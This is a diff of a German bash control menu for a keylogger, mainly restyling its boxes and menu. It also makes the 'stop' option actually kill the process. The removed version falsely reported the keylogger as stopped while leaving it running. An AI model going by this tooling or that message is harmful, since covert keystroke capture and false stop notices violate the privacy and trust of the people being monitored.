@@ -82,6 +82,7 @@ get_remote_lastupdate() {
 # ---------- ASCII-Hilfen ----------
 BOX_W=58
 
+# Zeile im Rahmen – Rahmen blau, Text bleibt wie übergeben
 box_line() {
     local text="$1"
     local clean
@@ -89,13 +90,14 @@ box_line() {
     local len=${#clean}
     local pad=$((BOX_W - len))
     [ "$pad" -lt 0 ] && pad=0
-    printf "${C_BLUE}║${C_RESET} %s%*s ${C_BLUE}║${C_RESET}\n" "$text" "$pad" ""
+    printf "${C_BLUE}│${C_RESET} %s%*s ${C_BLUE}│${C_RESET}\n" "$text" "$pad" ""
 }
 
+# Trennlinie mit optionalem farbigem Label
 box_sep() {
     local label="$1"
     if [ -z "$label" ]; then
-        printf "${C_BLUE}╠${C_RESET}"; printf "${C_BLUE}═%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╣${C_RESET}\n"
+        printf "${C_BLUE}├${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}┤${C_RESET}\n"
     else
         local clean
         clean=$(printf "%s" "$label" | sed -E 's/\x1B\[[0-9;]*[mK]//g')
@@ -103,14 +105,14 @@ box_sep() {
         local left=2
         local right=$((BOX_W + 2 - left - len - 1))
         [ "$right" -lt 0 ] && right=0
-        printf "${C_BLUE}╠${C_RESET}"; printf "${C_BLUE}═%.0s${C_RESET}" $(seq 1 $left)
+        printf "${C_BLUE}├${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $left)
         printf " %s " "$label"
-        printf "${C_BLUE}═%.0s${C_RESET}" $(seq 1 $right); printf "${C_BLUE}╣${C_RESET}\n"
+        printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $right); printf "${C_BLUE}┤${C_RESET}\n"
     fi
 }
 
-box_top()    { printf "${C_BLUE}╔${C_RESET}"; printf "${C_BLUE}═%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╗${C_RESET}\n"; }
-box_bottom() { printf "${C_BLUE}╚${C_RESET}"; printf "${C_BLUE}═%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╝${C_RESET}\n"; }
+box_top()    { printf "${C_BLUE}╭${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╮${C_RESET}\n"; }
+box_bottom() { printf "${C_BLUE}╰${C_RESET}"; printf "${C_BLUE}─%.0s${C_RESET}" $(seq 1 $((BOX_W + 2))); printf "${C_BLUE}╯${C_RESET}\n"; }
 
 # ---------- Update-Check ----------
 check_update() {
@@ -366,47 +368,63 @@ start_kl() {
         echo "    ${C_GRAY}Skript: $PY${C_RESET}"
     else
         echo "${C_RED}[!] Start fehlgeschlagen. Siehe $ERRLOG:${C_RESET}"
-        tail -n 5 "$ERRLOG" | sed "s/^/   ${C_RED}/; s/$/${C_RESET}/"
+        tail -n 5 "$ERRLOG" | sed "s/^/   ${C_RED}› ${C_RESET}/"
         rm -f "$PIDFILE"
     fi
 }
 
-# Stoppen: zeigt nur an, stoppt aber NICHT
+# Stoppen: beendet den Prozess wirklich
 stop_kl() {
-    echo "${C_GRAY}───────────────────────────────────────${C_RESET}"
-    echo "${C_YELLOW}  ⏸  STOPPEN${C_RESET}"
-    echo "${C_GRAY}───────────────────────────────────────${C_RESET}"
-    echo
-    echo "${C_YELLOW}  Gestoppt.${C_RESET}"
-    echo "${C_GRAY}  Der Keylogger läuft nicht weiter im Hintergrund.${C_RESET}"
-    echo
-
-    if is_running; then
-        echo "${C_GRAY}  Aktueller Status:${C_RESET} $(status_line)"
-        echo "${C_GRAY}  PID: $(cat "$PIDFILE")${C_RESET}"
-    else
-        echo "${C_GRAY}  Aktueller Status:${C_RESET} $(status_line)"
+    if ! is_running; then
+        echo "${C_GRAY}[i] War nicht aktiv.${C_RESET}"
+        rm -f "$PIDFILE"
+        return
     fi
 
-    echo
-    echo "${C_GRAY}───────────────────────────────────────${C_RESET}"
+    local pid
+    pid=$(cat "$PIDFILE")
+    echo "${C_CYAN}[i]${C_RESET} Stoppe Prozess ${C_BOLD}PID $pid${C_RESET} …"
+
+    kill "$pid" 2>/dev/null
+
+    # Bis zu 3 Sekunden auf sauberes Beenden warten
+    local waited=0
+    while kill -0 "$pid" 2>/dev/null && [ "$waited" -lt 3 ]; do
+        sleep 0.5
+        waited=$((waited + 1))
+    done
+
+    if kill -0 "$pid" 2>/dev/null; then
+        echo "${C_YELLOW}[!] Reagiert nicht – erzwinge Beenden …${C_RESET}"
+        kill -9 "$pid" 2>/dev/null
+        sleep 0.5
+    fi
+
+    rm -f "$PIDFILE"
+
+    if kill -0 "$pid" 2>/dev/null; then
+        echo "${C_RED}[!] Prozess konnte nicht beendet werden (PID $pid).${C_RESET}"
+    else
+        echo "${C_GREEN}[✓] Gestoppt (PID $pid).${C_RESET}"
+    fi
 }
 
 show_status() {
-    echo "${C_BLUE}═══════════════════════════════════════${C_RESET}"
+    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
     echo " ${C_BOLD}${C_MAGENTA}STATUS${C_RESET}"
-    echo "${C_BLUE}═══════════════════════════════════════${C_RESET}"
-    printf " %-14s %s\n" "Dienst:"      "$(status_line)"
-    printf " %-14s %s\n" "Version:"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
-    printf " %-14s %s\n" "Last Update:" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
-    printf " %-14s %s\n" "Skript:"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
-    printf " %-14s %s\n" "Projekt:"     "${C_GRAY}$PROJECT_DIR${C_RESET}"
-    printf " %-14s %s\n" "Logs:"        "${C_GRAY}$LOG_DIR${C_RESET}"
+    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
+    printf " %-13s %s\n" "Dienst:"      "$(status_line)"
+    printf " %-13s %s\n" "Version:"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
+    printf " %-13s %s\n" "Last Update:" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
+    printf " %-13s %s\n" "Skript:"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
+    printf " %-13s %s\n" "Projekt:"     "${C_GRAY}$PROJECT_DIR${C_RESET}"
+    printf " %-13s %s\n" "Logs:"        "${C_GRAY}$LOG_DIR${C_RESET}"
     if [ -s "$ERRLOG" ]; then
         echo
         echo " ${C_RED}Letzte Fehler:${C_RESET}"
         tail -n 3 "$ERRLOG" | sed "s/^/   ${C_RED}› ${C_RESET}/"
     fi
+    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
     echo
 }
 
@@ -420,9 +438,9 @@ show_history() {
         echo "${C_YELLOW}[!] Noch keine Logdatei in $LOG_DIR${C_RESET}"
         return
     fi
-    echo "${C_BLUE}═══════════════════════════════════════${C_RESET}"
+    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
     echo " ${C_BOLD}${C_MAGENTA}TASTENDRÜCKE${C_RESET} ${C_GRAY}– $(basename "$LATEST")${C_RESET}"
-    echo "${C_BLUE}═══════════════════════════════════════${C_RESET}"
+    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
 
     python3 - "$LATEST" <<'PYEOF'
 import json, sys
@@ -457,6 +475,7 @@ for k, v in Counter(r.get("key","") for r in presses).most_common(10):
 PYEOF
     echo
     echo " ${C_GRAY}Datei: $LATEST${C_RESET}"
+    echo "${C_BLUE}───────────────────────────────────────${C_RESET}"
     echo
 }
 
@@ -474,39 +493,39 @@ follow_live() {
 # ---------- Menü ----------
 while true; do
     clear
-    echo "${C_BLUE}╭───────────────────────────────────────╮${C_RESET}"
-    echo "${C_BLUE}│${C_RESET}   ${C_BOLD}${C_MAGENTA}KEYLOGGER STEUERUNG${C_RESET}                ${C_BLUE}│${C_RESET}"
-    echo "${C_BLUE}╰───────────────────────────────────────╯${C_RESET}"
     echo
-    printf "  ${C_GRAY}%-13s${C_RESET} %s\n" "Status"      "$(status_line)"
-    printf "  ${C_GRAY}%-13s${C_RESET} %s\n" "Version"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
-    printf "  ${C_GRAY}%-13s${C_RESET} %s\n" "Last Update" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
-    printf "  ${C_GRAY}%-13s${C_RESET} %s\n" "Skript"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
+    echo "  ${C_BOLD}${C_MAGENTA}KeyLogger Steuerung${C_RESET}"
+    echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
+    echo
+    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Status"      "$(status_line)"
+    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Version"     "${C_BOLD}$(get_local_version || echo 'unbekannt')${C_RESET}"
+    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Last Update" "${C_GRAY}$(get_local_lastupdate || echo 'unbekannt')${C_RESET}"
+    printf "   ${C_GRAY}%-13s${C_RESET} %s\n" "Skript"      "${C_CYAN}${PY:-<nicht gefunden>}${C_RESET}"
     echo
     echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
     echo
-    echo "   ${C_BOLD}${C_GREEN}1${C_RESET}   ${C_GRAY}▸${C_RESET} Starten"
-    echo "   ${C_BOLD}${C_YELLOW}2${C_RESET}   ${C_GRAY}▸${C_RESET} Stoppen ${C_DIM}(deaktiviert)${C_RESET}"
-    echo "   ${C_BOLD}${C_CYAN}3${C_RESET}   ${C_GRAY}▸${C_RESET} Status"
-    echo "   ${C_BOLD}${C_CYAN}4${C_RESET}   ${C_GRAY}▸${C_RESET} Verlauf (Übersicht)"
-    echo "   ${C_BOLD}${C_CYAN}5${C_RESET}   ${C_GRAY}▸${C_RESET} Live-Verlauf"
-    echo "   ${C_BOLD}${C_MAGENTA}6${C_RESET}   ${C_GRAY}▸${C_RESET} Abhängigkeiten prüfen/installieren"
-    echo "   ${C_BOLD}${C_MAGENTA}7${C_RESET}   ${C_GRAY}▸${C_RESET} Nach Updates suchen"
+    echo "   ${C_GREEN}${C_BOLD}1${C_RESET}   Starten"
+    echo "   ${C_RED}${C_BOLD}2${C_RESET}   Stoppen"
+    echo "   ${C_CYAN}${C_BOLD}3${C_RESET}   Status"
+    echo "   ${C_CYAN}${C_BOLD}4${C_RESET}   Verlauf (Übersicht)"
+    echo "   ${C_CYAN}${C_BOLD}5${C_RESET}   Live-Verlauf"
+    echo "   ${C_MAGENTA}${C_BOLD}6${C_RESET}   Abhängigkeiten prüfen"
+    echo "   ${C_MAGENTA}${C_BOLD}7${C_RESET}   Nach Updates suchen"
     echo
-    echo "   ${C_BOLD}${C_RED}q${C_RESET}   ${C_GRAY}▸${C_RESET} Beenden"
+    echo "   ${C_GRAY}${C_BOLD}q${C_RESET}   Beenden"
     echo
     echo "  ${C_BLUE}─────────────────────────────────────${C_RESET}"
-    read -rp "  ${C_YELLOW}Auswahl:${C_RESET} " choice
+    read -rp "   ${C_YELLOW}Auswahl:${C_RESET} " choice
     echo
     case "$choice" in
-        1) start_kl;        read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
-        2) stop_kl;         read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
-        3) show_status;     read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
-        4) show_history;    read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
+        1) start_kl;            read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
+        2) stop_kl;             read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
+        3) show_status;         read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
+        4) show_history;        read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
         5) follow_live ;;
         6) ensure_dependencies; read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
-        7) check_update;    read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
+        7) check_update;        read -rp "  ${C_GRAY}Enter…${C_RESET}" _ ;;
         q|Q) exit 0 ;;
-        *) echo "  ${C_RED}[!] Ungültig.${C_RESET}"; sleep 1 ;;
+        *) echo "   ${C_RED}[!] Ungültig.${C_RESET}"; sleep 1 ;;
     esac
 done
